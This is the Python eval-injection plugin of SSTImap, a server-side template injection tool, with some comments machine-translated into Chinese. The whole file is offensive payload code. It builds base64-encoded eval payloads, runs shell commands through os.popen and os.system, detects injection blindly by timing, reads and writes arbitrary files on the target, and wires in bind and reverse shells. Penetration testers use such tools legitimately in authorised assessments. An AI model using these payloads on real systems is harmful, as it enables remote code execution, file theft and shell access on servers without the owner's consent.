from core.plugin import Plugin
from utils import closures
from core import bash
from utils import rand


class Python(Plugin):
    header_type = "add"
    priority = 8
    plugin_info = {
        "Description": 'Python 中的 Eval 注入。基于 Python 的模板引擎的基础',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始Tplmap插件
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'render': """{code}""",
                'header': """str({header[0]}+{header[1]})+""",
                'trailer': """+str({trailer[0]}+{trailer[1]})""",
                'test_render': f"""str('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'render_error': {
                'render': """{code}""",
                'header': """getattr("", str({header[0]}+{header[1]})+str(""",
                'trailer': """).rstrip()+str({trailer[0]}+{trailer[1]}))""",
                'test_render': f"""str('{rand.randstrings[0]}'.join('{rand.randstrings[1]}'))""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'boolean': {
                'call': 'evaluate_blind',
                'test_bool_true':  "1 / ('a'.join('bc') == 'bac')",
                'test_bool_false': "1 / ('a'.join('bc') == 'abc')",
                'verify_bool_true':  "1 / (bool('False') == True)",
                'verify_bool_false': "1 / (bool('True') == False)"
            },
            'blind': {
                'call': 'evaluate_blind',
                'test_bool_true': """'a'.join('ab') == 'aab'""",
                'test_bool_false': 'True == False'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """str({code})""",
                'test_os': """'-'.join([__import__('os').name, __import__('sys').platform])""",
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) and __import__('time').sleep({delay})"""
            },
            'execute': {
                'call': 'evaluate',
                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode()).read()""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_boolean': {
                'call': 'evaluate',
                'execute_blind': """1 / (__import__('os').system(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) == 0)"""
            },
            'execute_blind': {
                'call': 'evaluate',
                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            },
            'write': {
                'call': 'evaluate',
                'write': """open("{path}", 'ab+').write(__import__("base64").urlsafe_b64decode('{chunk_b64}'))""",
                'truncate': """open("{path}", 'w').close()"""
            },
            'read': {
                'call': 'evaluate',
                'read': """__import__("base64").b64encode(open("{path}", "rb").read())"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """__import__("hashlib").md5(open("{path}", 'rb').read()).hexdigest()"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': '''__import__("hashlib").md5(open("{path}", 'rb').read()).hexdigest()=="{md5}"''',
                'exists_blind': '''__import__("os").path.isfile("{path}")'''
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            # 字符串上下文和基于错误的
            {'level': 1, 'prefix': '{closure}+', 'suffix': '+{rclosure}', 'closures': ctx_closures},
            # 使用 eval() 注入进行代码上下文转义并不容易，因为 eval 用于评估单个
            # 动态生成的 Python 表达式，例如eval("""1;打印 1""");会失败的。
            # Int escape is possible, but it will still likely fail later: 1.0.__str__()+...+""*1
            # TODO：插件应该支持 exec() 注入，这可以通过代码上下文转义来辅助
        ])

    language = 'python'


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
            closures.if_loops + closures.empty
        ],
}

